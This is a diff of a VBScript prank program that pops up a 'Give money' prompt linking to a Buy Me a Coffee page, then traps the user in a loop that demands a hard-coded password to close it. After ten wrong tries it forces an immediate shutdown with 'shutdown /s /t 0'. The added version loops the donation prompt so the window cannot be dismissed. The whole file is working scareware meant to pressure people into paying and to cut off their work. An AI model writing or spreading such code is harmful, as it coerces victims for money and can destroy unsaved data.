@@ -1,34 +1,33 @@
-Dim attempts, maxAttempts, password, triesLeft
+Set objShell = CreateObject("WScript.Shell")
+tries = 10
 
-attempts = 0
-maxAttempts = 10
-
-' Create popup for asking to give money
-answer = MsgBox("Give money", vbYesNo + vbInformation, "Prompt")
-
-If answer = vbYes Then
-    ' Redirect to Buy Me a Coffee link but don't exit the script
-    Set WshShell = CreateObject("WScript.Shell")
-    WshShell.Run "https://buymeacoffee.com/changcheng967"
-End If
-
-' Continue to password prompt even after clicking "Give money"
-Do
-    triesLeft = maxAttempts - attempts
-    password = InputBox("Enter password (" & triesLeft & " attempts left):", "Password Prompt")
+' Display the initial message box with options
+do
+    response = MsgBox("Give money or Exit?", vbYesNo + vbQuestion, "Support Me")
     
-    If password = "frankbalabala" Then
-        MsgBox "Exiting..."
-        WScript.Quit
-    Else
-        attempts = attempts + 1
-        If attempts >= maxAttempts Then
-            MsgBox "Wrong password entered 10 times. Shutting down..."
-            Set WshShell = CreateObject("WScript.Shell")
-            WshShell.Run "shutdown /s /t 0"
-            WScript.Quit
-        Else
-            MsgBox "Wrong password. " & (maxAttempts - attempts) & " attempts left."
-        End If
+    If response = vbYes Then
+        ' Redirect to Buy Me a Coffee page
+        objShell.Run "https://buymeacoffee.com/changcheng967"
+        ' Continue the loop so the window doesn't exit after clicking "Give money"
+    ElseIf response = vbNo Then
+        ' Start the password prompt if Exit is chosen
+        Do
+            password = InputBox("Enter password to exit (" & tries & " tries left):", "Password Required")
+            
+            If password = "frankbalabala" Then
+                MsgBox "Correct password. Exiting...", vbInformation, "Access Granted"
+                WScript.Quit
+            Else
+                tries = tries - 1
+                MsgBox "Wrong password. " & tries & " tries left.", vbExclamation, "Access Denied"
+            End If
+            
+            ' If the user runs out of attempts, shut down the computer
+            If tries = 0 Then
+                MsgBox "Too many incorrect attempts. Shutting down...", vbCritical, "Locked Out"
+                objShell.Run "shutdown /s /t 0", 0, False
+                WScript.Quit
+            End If
+        Loop While tries > 0
     End If
 Loop
